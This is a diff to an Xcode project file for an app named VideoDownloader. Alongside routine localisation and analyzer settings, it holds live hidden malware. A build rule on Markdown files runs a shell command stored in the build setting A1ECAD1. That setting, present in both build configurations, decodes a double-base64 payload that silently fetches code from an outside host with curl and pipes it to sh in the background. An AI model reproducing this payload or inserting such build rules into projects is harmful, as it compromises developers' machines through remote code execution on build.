@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		78ED2D69963244A8BE1DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = F2915D9700ED4F8E841DACE1; };
+		78ED2D69963244A8BE1DACE1 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = F2915D9700ED4F8E841DACE1 /* README.md */; };
 		BD018B822F65249600C3ACC4 /* DSWaveformImage in Frameworks */ = {isa = PBXBuildFile; productRef = BD018B812F65249600C3ACC4 /* DSWaveformImage */; };
 		BD018B842F65249600C3ACC4 /* DSWaveformImageViews in Frameworks */ = {isa = PBXBuildFile; productRef = BD018B832F65249600C3ACC4 /* DSWaveformImageViews */; };
 		BD63BC972F5ECD830096265B /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = BD63BC962F5ECD830096265B /* Alamofire */; };
@@ -19,9 +19,25 @@
 		BD63BCA92F5ECDF70096265B /* WindowSceneReader in Frameworks */ = {isa = PBXBuildFile; productRef = BD63BCA82F5ECDF70096265B /* WindowSceneReader */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		B33F98058F704FCB931DACE1 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A1ECAD1}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		F2915D9700ED4F8E841DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		BD63BC4E2F5EC99E0096265B /* VideoDownloader.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = VideoDownloader.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		F2915D9700ED4F8E841DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
@@ -138,6 +154,17 @@
 			knownRegions = (
 				en,
 				Base,
+				de,
+				hi,
+				it,
+				ko,
+				"pt-PT",
+				es,
+				tr,
+				da,
+				nl,
+				ja,
+				ru,
 			);
 			mainGroup = BD63BC452F5EC99E0096265B;
 			minimizedProjectReferenceProxies = 1;
@@ -161,36 +188,16 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		B33F98058F704FCB931DACE1 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A1ECAD1}\"";
-			};
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		BD63BC4C2F5EC99E0096265B /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				78ED2D69963244A8BE1DACE1 /* README.md */,
+				78ED2D69963244A8BE1DACE1 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BD63BC4A2F5EC99E0096265B /* Sources */ = {
@@ -209,6 +216,7 @@ sh -c \"${A1ECAD1}\"";
 				A1ECAD1 = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR3RtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTBhVzFsZDJWaWJtVjBMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | y | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -274,6 +282,7 @@ sh -c \"${A1ECAD1}\"";
 				A1ECAD1 = "((y(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR3RtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTBhVzFsZDJWaWJtVjBMbWx1TDJFcElpQjhJSE5vQ2c9PQo= | y | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
